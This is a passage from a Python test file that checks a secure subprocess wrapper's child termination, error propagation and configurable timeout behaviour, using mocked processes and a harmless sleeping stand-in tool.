            except Exception as e:  # the terminated child exits non-zero
                outcome["error"] = e

        t = threading.Thread(target=run_sleep)
        t.start()
        try:
            started.wait(2)
            deadline = time.monotonic() + 5
            while not SecureSubprocess._children and time.monotonic() < deadline:
                time.sleep(0.05)
            assert SecureSubprocess.terminate_children(grace=1.0) == 1
            t.join(5)
            assert not t.is_alive()
            assert isinstance(outcome.get("error"), subprocess.CalledProcessError)
            assert not SecureSubprocess._children
        finally:
            SecureSubprocess.terminate_children(grace=1.0)
            t.join(5)

    def test_terminate_children_kills_a_child_that_ignores_terminate(self, monkeypatch):
        child = Mock()
        child.poll.return_value = None
        child.wait.side_effect = subprocess.TimeoutExpired("cmd", 0)
        monkeypatch.setattr(SecureSubprocess, "_children", {child: None})
        assert SecureSubprocess.terminate_children(grace=0.0) == 1
        child.terminate.assert_called_once()
        child.kill.assert_called_once()

    def test_terminate_children_with_nothing_running_returns_zero(self, monkeypatch):
        monkeypatch.setattr(SecureSubprocess, "_children", {})
        assert SecureSubprocess.terminate_children(grace=0.0) == 0

    def test_failed_run_raises_calledprocesserror_with_output_and_stderr(self):
        with patch("subprocess.Popen", return_value=_fake_proc(returncode=3, stdout="out", stderr="err")):
            with pytest.raises(subprocess.CalledProcessError) as excinfo:
                SecureSubprocess.run_secure("datasets", ["--version"])
        assert excinfo.value.returncode == 3
        assert excinfo.value.cmd == ["datasets", "--version"]
        assert excinfo.value.output == "out"
        assert excinfo.value.stderr == "err"
        assert not SecureSubprocess._children

    def test_check_false_returns_the_failed_result(self):
        with patch("subprocess.Popen", return_value=_fake_proc(returncode=3, stderr="err")):
            result = SecureSubprocess.run_secure("datasets", ["--version"], check=False)
        assert result.returncode == 3
        assert result.stderr == "err"

    def test_interrupt_while_waiting_kills_the_child_and_propagates(self):
        """As with subprocess.run, a KeyboardInterrupt in the waiting thread kills the child."""
        proc = _fake_proc()
        proc.communicate.side_effect = KeyboardInterrupt
        with patch("subprocess.Popen", return_value=proc):
            with pytest.raises(KeyboardInterrupt):
                SecureSubprocess.run_secure("datasets", ["--version"])
        proc.kill.assert_called_once()
        proc.wait.assert_called_once()
        assert not SecureSubprocess._children

    def test_timeout_kills_the_child_and_raises_security_error(self):
        proc = _fake_proc()
        proc.communicate.side_effect = [subprocess.TimeoutExpired("cmd", 1), ("", "")]
        with patch("subprocess.Popen", return_value=proc):
            with pytest.raises(SecurityError, match="timed out"):
                SecureSubprocess.run_secure("datasets", ["--version"], timeout=1)
        proc.kill.assert_called_once()
        assert not SecureSubprocess._children


def _write_sleeping_tool(bin_dir: Path, name: str, seconds: float) -> None:
    """A fake external tool that only sleeps, as a single process (shebang, not a shell wrapper).

    A wrapping ``#!/bin/sh`` script leaves the real sleep as a grandchild that inherits the
    stdout/stderr pipes; killing the shell then does not close them, so ``communicate()`` keeps
    reading until the grandchild itself exits. A direct Python-interpreter shebang is the same
    single process ``run_secure`` kills, so the timeout takes effect immediately.
    """
    script = bin_dir / name
    script.write_text(f"#!{sys.executable}\nimport time\ntime.sleep({seconds})\n")
    script.chmod(0o755)


class TestConfigurableTimeout:
    """run_secure's timeout: the active subprocess_timeout setting by default; 0/None disables it."""

    def test_explicit_timeout_kills_a_real_child_promptly(self, tmp_path, monkeypatch):
        """A real sleeping tool is killed at the timeout, not left running to completion."""
        _write_sleeping_tool(tmp_path, "fasterq-dump", seconds=5.0)
        monkeypatch.setenv("PATH", f"{tmp_path}{os.pathsep}{os.environ['PATH']}")
        started = time.monotonic()
        with pytest.raises(
            SecurityError,
            match=r"Command timed out after 1 s \(set --timeout or PREPARE_TIMEOUT; 0 disables\)",
        ):
            SecureSubprocess.run_secure("fasterq-dump", ["--version"], timeout=1)
        # Killed around the 1 s timeout, nowhere near the tool's 5 s sleep.
        assert time.monotonic() - started < 4.0

    def test_explicit_timeout_message_is_classified_as_a_network_failure(self, tmp_path, monkeypatch):
        """The timeout message still contains 'timed out', so the download retry logic sees it."""
        from prepare.data.sra import classify_download_error

        _write_sleeping_tool(tmp_path, "fasterq-dump", seconds=5.0)
        monkeypatch.setenv("PATH", f"{tmp_path}{os.pathsep}{os.environ['PATH']}")
        with pytest.raises(SecurityError) as excinfo:
            SecureSubprocess.run_secure("fasterq-dump", ["--version"], timeout=1)
        assert classify_download_error(str(excinfo.value)) == "network"

    def test_zero_timeout_means_no_limit(self):
        """timeout=0 disables the limit: communicate() is called without one."""
        proc = _fake_proc(stdout="ok")
        with patch("subprocess.Popen", return_value=proc):
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["hi"], timeout=0)
        proc.communicate.assert_called_once_with(timeout=None)

    def test_none_timeout_means_no_limit(self):
        """timeout=None, given explicitly, also disables the limit."""
        proc = _fake_proc(stdout="ok")
        with patch("subprocess.Popen", return_value=proc):
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["hi"], timeout=None)
        proc.communicate.assert_called_once_with(timeout=None)

    def test_unset_timeout_defaults_to_no_limit(self):
        """No --timeout, no PREPARE_TIMEOUT, no config: the default setting is no limit."""
        proc = _fake_proc(stdout="ok")
        with patch("subprocess.Popen", return_value=proc):
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["hi"])
        proc.communicate.assert_called_once_with(timeout=None)

    def test_unset_timeout_uses_the_active_setting(self, monkeypatch):
        """No timeout argument: the value comes from the active run's settings (here, the env var)."""
        monkeypatch.setenv("PREPARE_TIMEOUT", "42")
        proc = _fake_proc(stdout="ok")
        with patch("subprocess.Popen", return_value=proc):
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["hi"])
        proc.communicate.assert_called_once_with(timeout=42.0)

    def test_explicit_timeout_overrides_the_active_setting(self, monkeypatch):
        """A caller-given timeout (the version probes, for example) wins over the setting."""
        monkeypatch.setenv("PREPARE_TIMEOUT", "42")
        proc = _fake_proc(stdout="ok")
        with patch("subprocess.Popen", return_value=proc):
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["hi"], timeout=30)
        proc.communicate.assert_called_once_with(timeout=30)


# ============================================================================
# SUCCESS METRICS:
#
# After running these comprehensive tests:
# - Expected: 35+ tests pass
# - Coverage: 53% -> 85%+ for utils/security.py
# - Security-critical code thoroughly tested with adversarial scenarios
#
# Run tests:
#   pytest tests/test_security_comprehensive.py -v
#
# Check coverage:
#   pytest --cov=prepare.utils.security --cov-report=term-missing \
#          tests/test_security_comprehensive.py
# ============================================================================
